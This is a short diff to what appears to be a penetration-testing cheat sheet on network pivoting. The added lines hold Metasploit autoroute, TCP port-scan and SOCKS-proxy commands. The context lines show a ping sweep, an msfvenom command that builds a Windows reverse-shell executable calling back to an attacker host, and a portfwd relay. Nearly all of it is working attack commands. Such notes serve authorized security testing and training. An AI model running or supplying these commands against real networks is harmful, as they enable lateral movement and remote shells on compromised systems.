@@ -536,6 +536,20 @@ for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | findstr "Reply"
 
 Port Forwarding
 ```
+run autoroute -s 10.2.16.0/20
+run autoroute -p
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS target2.test.local  
+set PORTS 1–1000  
+run
+
+use auxiliary/server/socks_proxy
+set SRVPORT 9050  
+set VERSION 4a  
+run
+
+
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.20.30.40 LPORT=4445 -f exe > MM2.exe 
 Whatever goes to Port 4445 on compromised host goes to 5555 on my host 
 portfwd add -L 192.168.126.147 -R -l 5555 -p 4445 
